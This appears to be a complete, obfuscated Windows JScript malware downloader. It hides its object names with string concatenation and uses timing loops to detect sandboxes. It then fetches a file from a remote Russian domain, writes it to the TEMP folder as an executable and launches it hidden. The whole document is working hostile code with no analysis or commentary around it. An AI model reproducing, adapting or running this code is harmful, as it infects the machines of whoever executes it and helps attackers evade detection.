var R = false;
var V0 = "Create"+"Object";
var X = function DC() {return WScript[V0]("WScript"+".Shell");}(), V1 = 11;
var ZE = "MSXML2"+".XMLHTTP";
var W = 2;
var T0 = W - 2;
function T(M){X["Run"](M, T0, T0);};
function GL(){return ZE + "";};
function V(B0, G){T0 = T0 * 1; return B0 - G;};
function P(){return V0;};
/*@cc_on
  @if (@_win32 || @_win64)
    R = true;
  @end
@*/
if (R)
{
var RI = "";
function S(){return 22;};
var F = 0; var B = 0;
function TL()
{
var UU = new this["Date"]();
var HH0 = UU["getUTCMilliseconds"]();
WScript["Sleep"](S());
var UU = new this["Date"]();
var UO = UU["getUTCMilliseconds"]();
WScript["Sleep"](S());
var UU = new this["Date"]();
var Q = UU["getUTCMilliseconds"]();
var F = "T1";
F = V(UO, HH0);
var B = "ZF";
B = V(Q, UO);
RI = "open";
return V(F, B);
}
var S0 = false;
var YN = false;
for (var ZA = T0; ZA < S() * 1; ZA++){if (TL() != T0){
S0 = true; 
B = "31" + 11 * F + B; 
YN = true; 
break;
}}
function XI() {return ((S0 == true) && (S0 == YN)) ? 1 : T0;};
if (S0 && XI() && YN){
function PF() {return X["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "NTpeKXX761EioaLJ.ex" + "e";};
 NF = GL();
 P0 = WScript[V0](NF);
 var HH = 1;
do { 
	for (;HH;){
	try {
		if (HH == 1)
		{
			P0[RI]("GET", "http://brand-obuv.ru/m3isud", false);
			P0["send"]();
			A = "Sleep";
			HH = 2;
		}
		WScript[A](S() + 120); 
		if (P0["readystate"] < 2 * 2) continue;
		HH = T0;
		function MT(JD) {var H = (1, 2, 3, 4, 5, JD); return H;};
		HJ = WScript[P()]("ADODB.Stream");
		NF = HJ;
		NF[RI]();
		NF["type"] = MT(1);
		NF["write"](P0["ResponseBody"]);
		HJ["position"] = MT(T0);
		NF["Save" + "ToFile"](PF(), 2);
		HJ["cl"+"ose"]();
		RR = PF();
		T(RR);
	} catch(S1){};};
}while (HH);
}
}

